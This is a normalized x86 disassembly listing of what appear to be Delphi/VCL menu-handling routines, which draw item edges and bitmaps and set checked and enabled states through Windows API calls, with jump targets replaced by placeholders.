mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_40439c
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41c9b0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d014
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_445e80
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d438
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41c9a8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41c9b0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41c9b0
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d014
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41c9a8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_421cfc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41c984
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d014
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d014
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb30
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_449e0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_420cf8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41c1e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_445e80
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41c9b0
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_448e6c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41c4b0
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d438
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d160
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_446170
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d438
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41cf68
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41c1e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403258
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_448e6c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a2d3
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_447f30
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_41d298
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_448e6c
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_44a420
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_44ae04
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_44a450
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_44a49c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_44a67e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403454
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_44a450
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_44ae04
mov esi eax
mov eax edi
call sub_44a420
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_40439c
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402c64
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404028
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_447f30
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_40429c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a685
lea eax [ ebp - 0x24 ]
call sub_403f90
lea eax [ ebp - 0x10 ]
call sub_403f90
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_448e6c
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_44a6b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_40439c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403fe4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44a6d8
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44a848
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_44a858
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_44a720
sub_44a720
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_448ddc
push eax
call CheckMenuItem
mov eax esi
call sub_44a6d8
sub_44a774
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_44a848
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_448ddc
push eax
call EnableMenuItem
sub_44a7ec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_44abac
mov edx eax
mov ecx ebx
mov eax edi
call sub_448d7c
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_44a6d8
sub_44a858
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4137ac
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_447e84
sub_44a8c8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_44a848
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_44a8b0
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_44abe0
mov ecx ebx
mov edx esi
mov eax edi
call sub_44a9d4
sub_44a910
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44a848
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44a858
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_44a968
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_44a848
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_44a858
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_44a858
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_44a9d4
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_447e84
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_448d7c
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_413828
